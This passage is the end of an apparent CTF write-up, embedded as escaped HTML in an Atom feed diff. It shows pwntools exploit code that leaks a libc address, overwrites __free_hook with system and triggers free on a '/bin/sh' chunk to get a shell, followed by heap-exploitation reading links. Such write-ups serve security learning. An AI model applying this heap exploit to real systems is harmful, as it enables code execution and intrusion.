+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;leaked_chunk_addr &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;u64(get_info()[:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;]) &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;# Leaked address of malloc chunk
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;LIBC_BASE &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;leaked_chunk_addr &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;LEAKED_CHUNK_OFFSET
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;libc.address &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;LIBC_BASE
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;info(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;Leaked chunk at &amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;hex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(leaked_chunk_addr))
+info(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;Found libc base: &amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;hex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;LIBC_BASE&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;))
+info(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;Found __free_hook address: &amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;hex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(libc.symbols[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;__free_hook&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;]))
+
+mem_write(libc.symbols[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;__free_hook&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;] , p64(libc.symbols[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;system&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;]), &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x50&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+malloc(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x50&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;&#x2F;bin&#x2F;sh&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;\x00&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+
+free()
+
+r.interactive()
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;&lt;h1 id=&quot;further-reading&quot;&gt;Further Reading&lt;&#x2F;h1&gt;
+&lt;p&gt;These are some resources that I found helpful when solving this challenge.&lt;&#x2F;p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;azeria-labs.com&#x2F;heap-exploitation-part-2-glibc-heap-free-bins&#x2F;&quot;&gt;https:&#x2F;&#x2F;azeria-labs.com&#x2F;heap-exploitation-part-2-glibc-heap-free-bins&#x2F;&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;shellphish&#x2F;how2heap&#x2F;blob&#x2F;master&#x2F;glibc_2.26&#x2F;tcache_poisoning.c&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;shellphish&#x2F;how2heap&#x2F;blob&#x2F;master&#x2F;glibc_2.26&#x2F;tcache_poisoning.c&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;heap-exploitation.dhavalkapil.com&#x2F;&quot;&gt;https:&#x2F;&#x2F;heap-exploitation.dhavalkapil.com&#x2F;&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;&#x2F;ol&gt;
+</content>
+	</entry>
+</feed>
